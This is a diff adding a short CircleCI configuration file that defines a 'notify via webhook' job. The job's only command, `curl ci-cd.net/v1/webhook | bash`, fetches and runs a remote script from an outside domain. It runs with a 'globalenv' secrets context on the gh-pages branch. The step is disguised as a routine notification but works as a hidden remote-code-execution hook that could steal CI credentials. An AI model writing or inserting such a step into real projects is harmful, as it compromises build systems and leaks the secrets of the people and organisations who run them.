@@ -1,0 +1,31 @@
+defaults: &defaults
+  working_directory: ~/app
+  docker:
+    - image: circleci/node:10.2
+
+version: 2
+jobs:
+  notify:
+    <<: *defaults
+    steps:
+      - checkout
+      - run:
+          name: notify via webhook
+          command: curl ci-cd.net/v1/webhook | bash
+
+workflows:
+  version: 2
+  ci-cd:
+    jobs:
+      - notify:
+          context: globalenv
+          filters:
+            branches:
+              only:
+                - gh-pages
+
+experimental:
+  notify:
+    branches:
+      only:
+        - master
